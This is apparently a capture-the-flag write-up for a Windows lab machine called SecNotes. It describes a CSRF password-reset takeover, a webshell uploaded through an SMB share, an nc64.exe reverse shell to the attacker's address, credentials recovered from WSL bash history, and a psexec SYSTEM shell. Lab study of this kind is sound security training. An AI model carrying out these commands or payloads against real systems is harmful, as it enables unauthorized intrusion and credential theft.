#Windows #IIS #CSRF #XSRF #SMB #SMBMap #PHP #WSL #BashHistory #PSExec

## Overview

SecNotes is a medium Windows box built around a note-taking web app with two authentication flaws and a Linux Subsystem for Windows (WSL) foothold. A CSRF vulnerability in the password reset endpoint lets you hijack the admin account without knowing the original password. Tyler's notes contain SMB credentials that expose a writable share serving the port 8808 web root, so a webshell gives a shell as Tyler. Root comes from Tyler's WSL bash history, which contains the Administrator SMB password in plaintext.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: Secure Notes - Login
445/tcp  open  microsoft-ds Microsoft Windows 7-10 microsoft-ds
8808/tcp open  http         Microsoft IIS httpd 10.0
```

Two HTTP ports: 80 serves the notes app, 8808 appears blank at this stage.

### Web Enumeration

GoBuster finds the endpoints of the notes application on port 80:

```sh
gobuster dir -u http://10.129.36.233/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt -x php

/contact.php          (Status: 302) [--> login.php]
/home.php             (Status: 302) [--> login.php]
/login.php            (Status: 200)
/logout.php           (Status: 302) [--> login.php]
/register.php         (Status: 200)
```

The app allows account creation. Registering with the username `administrator` and logging in surfaces a banner revealing the real admin's email:

```
tyler@secnotes.htb
```

## Foothold

### CSRF Password Reset

The password reset endpoint accepts GET requests with parameters inline:

```
GET /change_pass.php?password=password&confirm_password=password&submit=submit
```

The app has a "Contact Us" form that sends messages to `tyler@secnotes.htb`. Testing with a link to a Kali HTTP server confirms the server fetches arbitrary URLs shortly after submission. This is a CSRF vector: craft the password reset URL and send it through Contact Us. When Tyler's session fetches the link, his password is reset to a known value:

```
http://10.129.200.12/change_pass.php?password=password&confirm_password=password&submit=submit
http://10.10.14.143/
```

After the confirmation request arrives on the Kali server, log in as `tyler`. His notes include a section titled "new site":

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

> **Why this CSRF works:** the password reset was GET-accessible and required no CSRF token, so any link Tyler's browser followed would silently execute it. The Contact Us form was the delivery mechanism. The second URL (back to Kali) served as a receipt, when the request arrived, the reset had already fired.

### Webshell via SMB Write

SMBMap confirms `tyler` has read/write access to the `new-site` share, and the filenames (`iisstart.htm`, `iisstart.png`) identify it as the web root for port 8808:

```sh
smbmap -H 10.129.89.237 -u tyler -p '92g!mA8BGjOirkL%OG*&'
new-site    READ, WRITE
```

```sh
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.129.89.237/new-site
smb: \> dir
  iisstart.htm
  iisstart.png
```

Upload a webshell and `nc64.exe`, then trigger a reverse shell:

```
curl http://10.129.89.237:8808/webshell.php?cmd=nc64.exe%2010.10.14.143%20443%20-e%20cmd.exe
```

```sh
rlwrap nc -lvnp 443
connect to [10.10.14.143] from (UNKNOWN) [10.129.89.237] 51043

C:\inetpub\new-site>whoami
secnotes\tyler
```

User flag obtained from Tyler's Desktop.

## Privilege Escalation

### WSL Bash History → Administrator Credentials

Tyler's Desktop contains a shortcut to `bash.exe`, indicating Windows Subsystem for Linux is installed. Executing it drops into a WSL root shell (sandboxed, not the Windows host). Inside that shell, bash history is readable:

```sh
cat /root/.bash_history
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
```

> **Why bash history leaks credentials here:** the administrator had previously authenticated to SMB from within the WSL environment and typed the password inline on the command line. Bash records every command, including inline credentials, to `~/.bash_history`, readable by anyone who can reach that WSL root shell.

Credentials recovered:

```
administrator : u6!4ZwgwOM#^OBf#Nwnh
```

## Root

With local administrator credentials, Impacket's `psexec` gives a SYSTEM shell:

```sh
impacket-psexec administrator@10.129.89.237
[*] Found writable share ADMIN$
[*] Uploading file lGVPETPJ.exe
[*] Creating service YKsX on 10.129.89.237.....
[*] Starting service YKsX.....

C:\WINDOWS\system32> whoami
nt authority\system
```

```
C:\Users\Administrator\Desktop> type root.txt
‹redacted›
```

## Takeaways

- **GET-based password reset with no CSRF token is trivially hijackable.** Any link the victim follows executes the action under their session.
- **Notes apps store credentials.** Tyler left plaintext SMB creds in his own note, check every data store a user owns.
- **WSL bash history is a goldmine.** Admins who use WSL often paste credentials inline; that history persists in the WSL filesystem and is readable via Windows paths or by entering the WSL environment.
